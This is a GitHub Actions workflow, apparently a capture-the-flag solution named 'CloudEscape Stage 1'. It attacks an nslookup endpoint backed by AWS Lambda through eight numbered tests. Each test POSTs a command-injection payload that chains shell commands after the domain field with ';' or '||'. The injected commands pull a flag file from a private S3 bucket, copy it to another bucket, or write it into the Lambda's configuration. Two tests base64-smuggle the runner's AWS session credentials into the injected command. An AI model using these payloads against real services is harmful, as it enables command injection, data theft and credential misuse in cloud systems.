name: CloudEscape Stage 1 - Get Flag v10
on:
  workflow_dispatch:
  push:
    branches: [corgi]

permissions:
  id-token: write
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Recon - Check Lambda config timeout and role
        run: |
          echo "===== Lambda config ====="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 2>&1
          
          echo "===== cicdRole identity ====="
          aws sts get-caller-identity 2>&1

      - name: Test 1 - Simple aws s3 ls (no quoting issues)
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Simplest possible: just aws s3 ls with output redirected
          # No Python, no base64, no nested quotes
          PAYLOAD=$(python3 -c "
          import json
          cmd = 'x; /opt/bin/aws s3 ls s3://codec4f26c862a321ef5/ --region us-east-1 > /tmp/out 2>&1; /opt/bin/aws s3 cp /tmp/out s3://platform-bucket-009661764077-us-east-1/out.txt --region us-east-1 2>&1'
          print(json.dumps({'domain': cmd}))
          ")
          
          echo "=== Test 1 ==="
          echo "Payload: $PAYLOAD"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 11
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1

      - name: Test 2 - STS identity + write to S3
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          PAYLOAD=$(python3 -c "
          import json
          cmd = 'x; /opt/bin/aws sts get-caller-identity --region us-east-1 > /tmp/who 2>&1; /opt/bin/aws s3 cp /tmp/who s3://platform-bucket-009661764077-us-east-1/who.txt --region us-east-1 2>&1'
          print(json.dumps({'domain': cmd}))
          ")
          
          echo "=== Test 2 ==="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 11
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/who.txt - --region us-east-1 2>&1

      - name: Test 3 - Get flag and update Lambda description (Lambda own role)
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Read flag from S3, put it in Lambda description
          # If Lambda role has s3:GetObject AND lambda:UpdateFunctionConfiguration
          PAYLOAD=$(python3 -c "
          import json
          cmd = 'x; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag --region us-east-1 2>&1; /opt/bin/aws lambda update-function-configuration --function-name nslookupv2 --description file:///tmp/flag --region us-east-1 2>&1'
          print(json.dumps({'domain': cmd}))
          ")
          
          echo "=== Test 3 ==="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 11
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' --output text 2>&1

      - name: Test 4 - Get flag and update Lambda environment variable
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Get current Lambda config, add FLAG env var
          PAYLOAD=$(python3 -c "
          import json
          cmd = 'x; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag --region us-east-1 2>&1; F=$(cat /tmp/flag 2>/dev/null); /opt/bin/aws lambda update-function-configuration --function-name nslookupv2 --environment Variables={FLAG=$F} --region us-east-1 2>&1'
          print(json.dumps({'domain': cmd}))
          ")
          
          echo "=== Test 4 ==="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 11
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Environment' 2>&1

      - name: Test 5 - Use cicdRole creds with aws CLI for S3 copy
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          export AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
          export SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
          export TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
          
          PAYLOAD=$(python3 << 'PYEOF'
          import json, os
          a = os.environ['AKID_B64']
          s = os.environ['SKID_B64']
          t = os.environ['TOKEN_B64']
          
          cmd = f'x; export AWS_ACCESS_KEY_ID=$(echo {a}|base64 -d) AWS_SECRET_ACCESS_KEY=$(echo {s}|base64 -d) AWS_SESSION_TOKEN=$(echo {t}|base64 -d) AWS_DEFAULT_REGION=us-east-1; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag.txt --region us-east-1 2>&1'
          
          print(json.dumps({'domain': cmd}))
          PYEOF
          )
          
          echo "=== Test 5 ==="
          echo "Payload: ${#PAYLOAD} bytes"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 12
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1

      - name: Test 6 - Use cicdRole creds to get flag and update Lambda description
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          export AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
          export SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
          export TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
          
          # Use cicdRole creds to: read flag from S3, update Lambda description
          PAYLOAD=$(python3 << 'PYEOF'
          import json, os
          a = os.environ['AKID_B64']
          s = os.environ['SKID_B64']
          t = os.environ['TOKEN_B64']
          
          cmd = f'x; export AWS_ACCESS_KEY_ID=$(echo {a}|base64 -d) AWS_SECRET_ACCESS_KEY=$(echo {s}|base64 -d) AWS_SESSION_TOKEN=$(echo {t}|base64 -d) AWS_DEFAULT_REGION=us-east-1; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag --region us-east-1 2>&1; /opt/bin/aws lambda update-function-configuration --function-name nslookupv2 --description file:///tmp/flag --region us-east-1 2>&1'
          
          print(json.dumps({'domain': cmd}))
          PYEOF
          )
          
          echo "=== Test 6 ==="
          echo "Payload: ${#PAYLOAD} bytes"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 12
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' --output text 2>&1

      - name: Test 7 - Direct S3 copy with Lambda own role (no semicolon - use ||)
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Use || instead of ; to chain commands - this way /opt/nslookup runs first,
          # and regardless of its result, the aws command runs
          PAYLOAD=$(python3 -c "
          import json
          cmd = 'x || /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag.txt --region us-east-1 2>&1'
          print(json.dumps({'domain': cmd}))
          ")
          
          echo "=== Test 7 ==="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 11
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1

      - name: Test 8 - Write test string to S3 (verify S3 write works at all)
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Simplest possible S3 write: echo HELLO to file, then aws s3 cp
          PAYLOAD=$(python3 -c "
          import json
          cmd = 'x; echo TESTVAL > /tmp/t; /opt/bin/aws s3 cp /tmp/t s3://platform-bucket-009661764077-us-east-1/test-val.txt --region us-east-1 2>&1'
          print(json.dumps({'domain': cmd}))
          ")
          
          echo "=== Test 8 ==="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 11
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1

      - name: Final check
        if: always()
        run: |
          echo "===== Platform bucket ====="
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
          echo "===== Lambda Description ====="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' --output text 2>&1
          echo "===== Lambda Environment ====="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Environment' 2>&1
          
          echo "===== Read who.txt ====="
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/who.txt - --region us-east-1 2>&1
          echo
          echo "===== Read out.txt ====="
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/out.txt - --region us-east-1 2>&1
          echo
          echo "===== Read test-val.txt ====="
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/test-val.txt - --region us-east-1 2>&1
          echo
          echo "===== Read flag.txt ====="
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag.txt - --region us-east-1 2>&1